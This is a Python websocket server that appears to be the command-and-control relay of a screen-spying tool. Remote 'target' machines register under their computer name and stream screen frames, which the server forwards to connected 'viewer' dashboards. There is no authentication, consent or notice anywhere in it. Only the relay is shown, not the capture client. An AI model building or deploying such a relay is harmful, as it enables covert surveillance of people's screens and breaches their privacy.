import json
import os
import asyncio
import logging
import uvicorn

logging.basicConfig(level=logging.INFO)

# Global states: map active instances
live_targets = {}      # { "Target-PC": send_coroutine }
connected_viewers = set()  # { send_coroutine, send_coroutine }

async def broadcast_to_viewers(payload_dict):
    """Pushes system lists or frames out to all listening dashboard instances."""
    if not connected_viewers:
        return
    message = {
        "type": "websocket.send",
        "text": json.dumps(payload_dict)
    }
    # Safely dispatch concurrently across active dashboard connections
    await asyncio.gather(*[viewer(message) for viewer in list(connected_viewers)], return_exceptions=True)

async def app(scope, receive, send):
    # --- 1. HANDLE HTTP ENTIRELY (Render Health Checks, HEAD, GET) ---
    if scope['type'] == 'http':
        await send({
            'type': 'http.response.start',
            'status': 200,
            'headers': [(b'content-type', b'text/plain')],
        })
        await send({
            'type': 'http.response.body',
            'body': b'Healthy',
        })
        return

    # --- 2. HANDLE WEBSOCKET PIPELINE ---
    if scope['type'] == 'websocket':
        await send({'type': 'websocket.accept'})
        
        client_type = None
        target_name = None
        
        try:
            while True:
                message = await receive()
                if message['type'] == 'websocket.disconnect':
                    break
                
                if 'text' in message:
                    payload = json.loads(message['text'])
                    msg_type = payload.get("type")
                    
                    # Dashboard connection handshake
                    if msg_type == "register_viewer":
                        client_type = "viewer"
                        connected_viewers.add(send)
                        
                        # Sync active listings to dashboard immediately
                        await send({
                            'type': 'websocket.send',
                            'text': json.dumps({"type": "list", "data": list(live_targets.keys())})
                        })
                    
                    # Target connection handshake
                    elif msg_type == "register_target":
                        client_type = "target"
                        target_name = payload.get("COMPUTERNAME", "Unknown-Target")
                        live_targets[target_name] = send
                        
                        # Notify all dashboards a new machine is online
                        await broadcast_to_viewers({"type": "list", "data": list(live_targets.keys())})
                    
                    # Relay screen streaming frame data
                    elif msg_type == "stream_frame" and client_type == "target":
                        frame_data = payload.get("frame")
                        await broadcast_to_viewers({
                            "type": "frame",
                            "user": target_name,
                            "frame": frame_data
                        })
                        # Return an acknowledgement response back to the target client loop
                        await send({
                            'type': 'websocket.send',
                            'text': json.dumps({"status": "OK"})
                        })
                        
        except Exception as e:
            logging.error(f"Connection session encountered an error: {e}")
        finally:
            # Clean up records when either end terminates
            if client_type == "viewer" and send in connected_viewers:
                connected_viewers.remove(send)
            elif client_type == "target" and target_name in live_targets:
                del live_targets[target_name]
                # Update remaining viewers that target went offline
                await broadcast_to_viewers({"type": "list", "data": list(live_targets.keys())})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    # Fire up Uvicorn to host the application entry point
    uvicorn.run(app, host="0.0.0.0", port=port, log_level="info")